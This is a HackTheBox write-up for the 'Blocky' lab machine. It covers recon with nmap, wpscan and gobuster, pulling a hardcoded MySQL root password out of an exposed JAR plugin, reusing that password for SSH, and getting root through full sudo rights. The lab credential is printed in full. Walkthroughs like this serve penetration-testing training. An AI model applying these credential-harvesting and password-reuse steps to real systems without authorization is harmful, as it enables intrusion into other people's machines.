# Blocky - HackTheBox Writeup

## Machine Info
- **Name:** Blocky
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy
- **IP:** 10.129.45.198

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -sC -sV -oA blocky 10.129.45.198
```

**Results:**
```
PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     ProFTPD 1.3.5a
22/tcp    open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp    open   http    Apache httpd 2.4.18
25565/tcp open   minecraft Minecraft 1.11.2
```

### Add Hosts Entry

```bash
echo "10.129.45.198 blocky.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

### WPScan

```bash
wpscan --url http://blocky.htb --enumerate
```

**Key Findings:**
- WordPress 4.8 (outdated)
- Theme: twentyseventeen 1.3
- User identified: **notch**
- XML-RPC enabled
- Upload directory has listing enabled

### Directory Brute-forcing (Gobuster)

```bash
gobuster dir -u http://blocky.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Discovered Directories:**
- /``plugins/`` - Contains JAR files
- /``phpmyadmin/`` - MySQL admin panel
- /``wiki/`` - Wiki
- /``wp-admin/`` - WordPress admin
- /``wp-content/`` - WordPress content
- /``wp-includes/`` - WordPress includes
- /``javascript/`` - JavaScript files

---

## 3. Exploitation

### Discovering JAR Files

Navigate to the plugins directory:

```bash
curl http://blocky.htb/plugins/
```

**Found files:**
- `BlockyCore.jar`
- `gson-2.4.jar`

### Download JAR Files

```bash
wget http://blocky.htb/plugins/BlockyCore.jar
wget http://blocky.htb/plugins/gson-2.4.jar
```

### Extract JAR Files

```bash
jar -xf BlockyCore.jar
find . -name "*.class"
```

**Found:** `com/myfirstplugin/BlockyCore.class`

### Analyze BlockyCore.class

```bash
strings BlockyCore.class
```

**Key finding - MySQL credentials:**

```java
String url = "jdbc:mysql://localhost:3306/blocky?user=root&password=8YsqfCTnvxAUeduzjNSXe22";
```

**Credentials found:**
- **Database user:** root
- **Database password:** 8YsqfCTnvxAUeduzjNSXe22

---

## 4. Gaining Access

### SSH Login

The MySQL root password is likely reused for SSH.

```bash
ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa notch@10.129.45.198
```

**Password:** `8YsqfCTnvxAUeduzjNSXe22`

**Success!** Logged in as `notch`

### Alternative - Try Other Users

```bash#Try root
ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.129.45.198
```

**Password:** `8YsqfCTnvxAUeduzjNSXe22`

---

## 5. Privilege Escalation

### Check Sudo Privileges

```bash
sudo -l
```

**Output:**
```
User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

### Become Root

```bash
sudo su
# Enter password: 8YsqfCTnvxAUeduzjNSXe22
```

**Success!** Now root!

---

## 6. Capture Flags

### User Flag

```bash
cat /home/notch/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Summary

Blocky is an easy machine that demonstrates:

1. **Information Disclosure**: WordPress plugin directory exposed JAR files
2. **Reverse Engineering**: Java class file contained hardcoded MySQL credentials
3. **Credential Reuse**: MySQL password reused for system user accounts
4. **Misconfiguration**: User `notch` had full sudo privileges

**Key takeaway:** Always check exposed files for hardcoded credentials and test password reuse across services!
